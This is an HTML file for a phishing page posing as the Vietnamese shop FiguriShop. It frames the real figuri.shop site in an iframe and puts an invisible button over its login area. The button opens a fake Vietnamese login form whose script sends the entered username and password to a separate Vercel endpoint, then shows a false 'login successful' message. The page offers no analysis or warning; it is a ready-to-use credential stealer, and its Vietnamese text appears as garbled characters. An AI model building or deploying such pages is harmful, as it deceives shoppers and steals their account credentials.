<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>FiguriShop</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    .container {
      position: relative;
      width: 100%;
      height: 800px;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
    .overlay-button {
      position: absolute;
      top: 30px;
      right: 50px;
      width: 300px;
      height: 60px;
      background: transparent;
      border: none;
      z-index: 10;
      cursor: pointer;
    }

.login-popup {
  display: none;
  position: fixed;
  top: 30%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 100;
  background-color: white;
  border: 1px solid #ccc;
  padding: 30px 40px;
  box-shadow: 0 0 15px rgba(0,0,0,0.4);
  width: 387px; /* üëà Gi·∫£m b·ªõt 0.5cm */
  border-radius: 15px; /* üëà Bo tr√≤n khung */
}


    .login-popup h3 {
      margin-top: 0;
      font-size: 22px;
      text-align: left;
      color: #333;
    }

    .login-popup label {
      font-weight: bold;
      font-size: 14px;
      display: block;
      margin-top: 10px;
      margin-bottom: 5px;
    }

.login-popup input[type="text"],
.login-popup input[type="password"] {
  width: calc(100% - 5mm); /* gi·∫£m 0.5 cm */
  padding: 10px;
  border: 2px solid #888;
  border-radius: 3px;
  background-color: #f0f7ff;
  font-size: 14px;
}


    .login-popup button {
      width: 150px;
      padding: 10px;
      margin-top: 15px;
      background-color: #a00000;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      font-size: 14px;
      cursor: pointer;
    }

    .login-popup button:hover {
      background-color: #880000;
    }

    .login-popup .options {
      display: flex;
      align-items: center;
      margin-top: 10px;
    }

    .login-popup .options label {
      margin: 0 0 0 5px;
      font-weight: normal;
    }

    .login-popup .forgot {
      margin-top: 10px;
      font-size: 13px;
      color: #333;
    }

    .overlay-background {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 99;
    }

    #successMessage {
      display: none;
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #4CAF50;
      color: white;
      padding: 12px 24px;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
      z-index: 200;
      font-family: Arial, sans-serif;
    }
  </style>
</head>
<body>

  <div class="container">
    <iframe src="https://figuri.shop"></iframe>
    <button class="overlay-button" onclick="showLogin()"></button>
  </div>

  <div class="overlay-background" id="overlayBg" onclick="hideLogin()"></div>

  <div class="login-popup" id="loginPopup">
    <h3>ƒêƒÇNG NH·∫¨P</h3>
    <form id="loginForm">
      <label for="username">T√™n t√†i kho·∫£n ho·∫∑c ƒë·ªãa ch·ªâ email *</label>
      <input type="text" id="username" placeholder="T√™n ƒëƒÉng nh·∫≠p" required>

      <label for="password">M·∫≠t kh·∫©u *</label>
      <input type="password" id="password" placeholder="M·∫≠t kh·∫©u" required>

      <button type="submit">ƒêƒÇNG NH·∫¨P</button>

      <div class="options">
        <input type="checkbox" id="remember">
        <label for="remember">Ghi nh·ªõ m·∫≠t kh·∫©u</label>
      </div>

      <div class="forgot">
        <a href="#">Qu√™n m·∫≠t kh·∫©u?</a>
      </div>
    </form>
  </div>

  <div id="successMessage">
    ‚úÖ ƒêƒÉng nh·∫≠p th√†nh c√¥ng!
  </div>

  <!-- ‚úÖ ƒê·∫∑t script ·ªü cu·ªëi ƒë·ªÉ kh√¥ng b·ªã l·ªói -->
  <script>
    function showLogin() {
      document.getElementById('loginPopup').style.display = 'block';
      document.getElementById('overlayBg').style.display = 'block';
    }

    function hideLogin() {
      document.getElementById('loginPopup').style.display = 'none';
      document.getElementById('overlayBg').style.display = 'none';
    }

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://figurii1.vercel.app/api/submit', true); 
      xhr.setRequestHeader('Content-Type', 'application/json');

      xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
          console.log('‚úÖ D·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c g·ª≠i:', xhr.responseText);
          hideLogin();

          const msg = document.getElementById('successMessage');
          msg.style.display = 'block';
          setTimeout(() => {
            msg.style.display = 'none';
          }, 3000);
        } else {
          console.error('‚ùå L·ªói khi g·ª≠i d·ªØ li·ªáu:', xhr.statusText);
        }
      };

      xhr.onerror = function() {
        console.error('‚ùå L·ªói k·∫øt n·ªëi ho·∫∑c CORS b·ªã ch·∫∑n');
      };

      xhr.send(JSON.stringify({ username, password }));
    });
  </script>

</body>
</html>
